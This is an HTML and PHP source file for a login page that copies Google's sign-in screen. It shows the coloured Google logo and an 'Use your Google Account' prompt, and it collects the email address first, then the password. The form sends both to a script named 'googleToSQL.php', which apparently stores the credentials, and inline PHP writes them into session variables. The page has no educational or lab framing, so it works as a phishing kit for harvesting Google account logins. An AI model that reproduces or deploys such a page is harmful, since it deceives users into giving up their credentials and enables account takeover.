<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans:wght@400;600;750&display=swap" rel="stylesheet">
    <title>Login Form</title>
    <style>
        body {
            font-family: 'Noto Sans', Arial, sans-serif;
            background-color: #f0f0f0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .container {
            text-align: center;
            max-width: 500px;
            bottom: 232px;
            width: 100%;
            padding: 0;
            box-sizing: border-box;
            position: relative;
        }
        .google-logo {
            font-family: 'Noto Sans', sans-serif;
            font-size: 23px;
            font-weight: 600;
            letter-spacing: -3.4px;
            margin-bottom: 30px; 
        }
        .google-logo span {
            display: inline-block;
        }
        .g1 { color: rgb(66,133,244); }
        .o1, .e { color: rgb(234,67,53); }
        .o2 { color: rgb(251,188,5); }
        .g2 { color: rgb(66,133,244); }
        .l  { color: rgb(52, 168,83); }
        h2 {
            font-size: 24px;
            color: rgb(32,33,36);
            font-weight: 400;
            margin: 0;
        }
        p {
            color: rgb(32,33,36);
            font-size: 14px;
            font-weight: 400;
            margin: 10px 0;
        }
        .form-input {
            width: 100%; 
            max-width: 345px;
            height: 50px;
            padding: 10px;
            border-radius: 5px;
            border: 1px solid #ddd;
            font-size: 14px;
            margin: 20px auto; 
            box-sizing: border-box;
        }
        .submit-btn {
            width: 100%;
            max-width: 75px;
            font-weight: bold;
            padding: 10px;
            border-radius: 5px;
            border: none;
            color: white;
            background-color: #1a73e8;
            cursor: pointer;
            font-size: 14px;
            margin: 20px auto;
            margin-left: 156px;
        }
        .forgotE, .createA, .private {
            text-align: left;
            padding-left: 10px;
            margin: 10px auto;
            display: block;
            max-width: 345px;
        }

        .private{
            margin-top: 40px;
        }

        .forgotE{
            margin-top: -10px;
        }
        .learn {
            color: #1a73e8;
            font-weight: bold;
            text-decoration: none;
        }

        /* Media Queries  */
        @media (max-width: 407px) {
            .submit-btn{
                margin-left: 125px;
            }
            .form-input,

            .forgotE,
            .private,
            .createA {
                width: calc(100% - 20px);
            }
            .forgotE,
            .private,
            .createA {
                padding-left: 10px;
            }
        }

        @media (max-height: 750px) {
            .container {
                bottom: 100px;
            }
            .form-input,
            .submit-btn,
            .forgotE,
            .private,
            .createA {
                width: calc(100% - 20px);
            }
            .forgotE,
            .private,
            .createA {
                padding-left: 10px;
            }
        }


        @media (min-width: 768px) {

            .form-input,
            .submit-btn,
            .forgotE,
            .private,
            .createA {
                width: 345px;
            }
        }

        /* STyles for password screen */
 .form-section {
            transition: transform 0.2s ease-in-out;
        }

    

        #welcome-text {
            text-align: center; 
            color: rgb(32,33,36);
            font-size: 14px;
            font-weight: 400;
            margin: 10px 0;
        }
        
        .password-container {
            z-index: 10;
            position: absolute !important;
            top: -200px ; /* Adjust this value to move the container higher up */
            bottom: 80px;
            left: 50%; /* Position at 50% of the container width */
            width: 100%; /* Set width to 100% of the parent container */
            max-width: 500px; /* Same as the container max-width */
            min-height: 0vh !important;

        }

        /* Adjustments for the sliding effect */
        .slide-left {
            transform: translateX(-50%); /* Adjust for centering */
        }

     

        .Welcome{
            font-family: 'Noto Sans', Arial, sans-serif;
            font-size: 24px;
            color: rgb(32,33,36);
            font-weight: 400;
            margin: 0;
        }
        
        
        .show-password {
            text-align: left;
            padding-left: 9px;
            margin: auto;
            display: block;
            max-width: 345px;

            color: rgb(32,33,36);
            font-size: 14px;
            font-weight: 400;
        }
        #password-button {
            margin: 20px auto;
            margin-left: 120px;
        }

        .forgotP{
            text-align: left;
            padding-left: 10px;
            max-width: 345px;

        }
        
        .welcome-text{
            border-radius: 5px;
            border: 1px solid #ddd;

        }

    </style>
</head>
<body>
    <div class="container">

        <form id="form-section" class="form-section" action="googleToSQL.php" method="POST">


            <!-- Email form -->
            <div id="email-form" style="display: block;">
                <div class="google-logo">
                    <span class="g1">G</span>
                    <span class="o1">o</span>
                    <span class="o2">o</span>
                    <span class="g2">g</span>
                    <span class="l">l</span>
                    <span class="e">e</span>
                </div>
                <h2>Sign in</h2>
                <p>Use your Google Account</p>
                <input id="email-input" class="form-input" type="email" name="email" placeholder="Email or phone" required>
                <p class="forgotE"><a href="#" class="learn">Forgot Email?</a></p>
                <p class="private">Not on your computer? Use a private browsing window to sign in. <a href="#" class="learn">Learn more</a></p>
                <p class="createA"><a href="#" class="learn">Create Account</a> <button class="submit-btn" type="button" onclick="slideToPassword()">Next</button></p>
            </div>

            <div id="password-container" class="password-container" style="display: none; right:0; transform: translateX(100%);">
                <div class="google-logo">
                    <span class="g1">G</span>
                    <span class="o1">o</span>
                    <span class="o2">o</span>
                    <span class="g2">g</span>
                    <span class="l">l</span>
                    <span class="e">e</span>
                </div>
                <h2>Welcome,</h2>
                <p id="welcome-text"></p>
                <div id="password-form">
                    <input id="password-input" class="form-input" type="password" name="password" placeholder="Enter password" required>
                    <div class="show-password">
                        <input id="toggle-password" type="checkbox" onclick="togglePassword()"> Show password </div>
                    <div>
                        <p class="forgotP"><a href="#" class="learn">Forgot password?</a>
                            <button id="password-button" class="submit-btn" type="submit">Next</button>

                        </p>
                    </span>
                </div>
            </div>
        </form>
    </div>

    <script>
        console.log()

        function slideToPassword() {
            const emailForm = document.getElementById('email-form');
            const passwordContainer = document.getElementById('password-container');
            const formSection = document.getElementById('form-section');
            const email = document.getElementById('email-input').value;
            const welcomeText = document.getElementById('welcome-text');

            // Update welcome text
            welcomeText.textContent = `${email}`;

            setTimeout(() => {
                emailForm.style.display = 'none';
                document.getElementById('password-form').style.display = 'block';
            }, ); 

            // Slide out email form and slide in password container
            formSection.classList.add('slide-left');
            passwordContainer.style.display = 'block';
            passwordContainer.style.transform = 'translateX(0)';

            // Hide email form and show password form after the sliding transition

        }

        function togglePassword() {
            const passwordInput = document.getElementById('password-input');
            passwordInput.type = passwordInput.type === 'password' ? 'text' : 'password';
        }
    </script>

<?php
    session_start();
    if (isset($_POST['email'])) {
        $email = $_POST['email'];
        $_SESSION['email'] = $email;
    }

    if (isset($_POST['password'])) {
        $email = $_POST['password'];
        $_SESSION['password'] = $password;
    }

    ?>
</body>
</html>